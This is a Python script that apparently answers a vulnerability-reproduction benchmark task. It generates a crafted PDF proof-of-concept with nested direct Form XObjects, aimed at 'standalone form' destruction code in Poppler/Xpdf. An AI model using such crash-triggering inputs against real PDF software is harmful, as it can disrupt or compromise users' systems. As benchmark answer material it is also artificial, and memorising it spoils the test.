import os
import tarfile
from typing import List, Tuple, Optional


def _direct_stream(dict_entries: List[bytes], data: bytes) -> bytes:
    if not data.endswith(b"\n"):
        data += b"\n"
    d = b"<<\n" + b"\n".join(dict_entries + [b"/Length " + str(len(data)).encode("ascii")]) + b"\n>>\n"
    return d + b"stream\n" + data + b"endstream\n"


def _indirect_object(obj_num: int, content: bytes) -> bytes:
    if not content.endswith(b"\n"):
        content += b"\n"
    return str(obj_num).encode("ascii") + b" 0 obj\n" + content + b"endobj\n"


def _build_pdf_poc() -> bytes:
    # Build nested direct Form XObjects to exercise "standalone form" destruction paths.
    # Page Resources includes direct stream XObjects (not indirect), and page content executes them via Do.
    fm2_data = b"0 0 200 200 re f\n"
    fm2 = _direct_stream(
        [
            b"/Type /XObject",
            b"/Subtype /Form",
            b"/FormType 1",
            b"/BBox [0 0 200 200]",
            b"/Resources << >>",
        ],
        fm2_data,
    )

    fm1_data = b"q /Fm2 Do Q\n"
    fm1 = _direct_stream(
        [
            b"/Type /XObject",
            b"/Subtype /Form",
            b"/FormType 1",
            b"/BBox [0 0 200 200]",
            b"/Resources << /XObject << /Fm2 " + fm2 + b" >> >>",
        ],
        fm1_data,
    )

    fmx_data = b"0 0 50 50 re f\n"
    fmx = _direct_stream(
        [
            b"/Type /XObject",
            b"/Subtype /Form",
            b"/FormType 1",
            b"/BBox [0 0 50 50]",
            b"/Resources << >>",
        ],
        fmx_data,
    )

    ap_data = b"0 0 30 30 re f\n"
    ap_stream = _direct_stream(
        [
            b"/Type /XObject",
            b"/Subtype /Form",
            b"/FormType 1",
            b"/BBox [0 0 30 30]",
            b"/Resources << >>",
        ],
        ap_data,
    )

    annot = (
        b"<<\n"
        b"/Type /Annot\n"
        b"/Subtype /Widget\n"
        b"/Rect [10 10 60 60]\n"
        b"/F 4\n"
        b"/T (A)\n"
        b"/FT /Btn\n"
        b"/V /Off\n"
        b"/AP << /N " + ap_stream + b" >>\n"
        b">>\n"
    )

    contents_data = b"q /Fm1 Do Q\nq /FmX Do Q\n"
    if not contents_data.endswith(b"\n"):
        contents_data += b"\n"
    contents_stream = (
        b"<< /Length " + str(len(contents_data)).encode("ascii") + b" >>\n"
        b"stream\n" + contents_data + b"endstream\n"
    )

    header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

    obj1 = b"<< /Type /Catalog /Pages 2 0 R >>\n"
    obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"

    page = (
        b"<<\n"
        b"/Type /Page\n"
        b"/Parent 2 0 R\n"
        b"/MediaBox [0 0 612 792]\n"
        b"/Resources << /XObject << /Fm1 " + fm1 + b" /FmX " + fmx + b" >> >>\n"
        b"/Annots [5 0 R]\n"
        b"/Contents 4 0 R\n"
        b">>\n"
    )

    objects: List[bytes] = [
        _indirect_object(1, obj1),
        _indirect_object(2, obj2),
        _indirect_object(3, page),
        _indirect_object(4, contents_stream),
        _indirect_object(5, annot),
    ]

    out = bytearray()
    out += header

    offsets: List[int] = [0]  # obj 0
    for obj in objects:
        offsets.append(len(out))
        out += obj

    xref_pos = len(out)
    size = len(objects) + 1
    out += b"xref\n"
    out += b"0 " + str(size).encode("ascii") + b"\n"
    out += b"0000000000 65535 f \n"
    for i in range(1, size):
        off = offsets[i]
        out += f"{off:010d} 00000 n \n".encode("ascii")

    out += b"trailer\n"
    out += b"<< /Size " + str(size).encode("ascii") + b" /Root 1 0 R >>\n"
    out += b"startxref\n"
    out += str(xref_pos).encode("ascii") + b"\n"
    out += b"%%EOF\n"
    return bytes(out)


def _looks_like_poppler_xpdf_source(src_path: str) -> bool:
    try:
        if not os.path.exists(src_path):
            return False
        with tarfile.open(src_path, "r:*") as tf:
            names = tf.getnames()
            for n in names[:2000]:
                ln = n.lower()
                if "poppler" in ln or "xpdf" in ln:
                    return True
                if ln.endswith("object.h") or ln.endswith("dict.h"):
                    return True
            # Try a quick content scan for "StandaloneForm" or "Object(Dict"
            scan = 0
            for m in tf.getmembers():
                if scan >= 50:
                    break
                if not m.isfile():
                    continue
                ln = m.name.lower()
                if not (ln.endswith(".cc") or ln.endswith(".cpp") or ln.endswith(".c") or ln.endswith(".h") or ln.endswith(".hh")):
                    continue
                scan += 1
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read(200000)
                if b"StandaloneForm" in data or b"Object(Dict" in data or b"Object (Dict" in data:
                    return True
    except Exception:
        return False
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        # The PoC is a crafted PDF; source inspection is best-effort only.
        _ = _looks_like_poppler_xpdf_source(src_path)
        return _build_pdf_poc()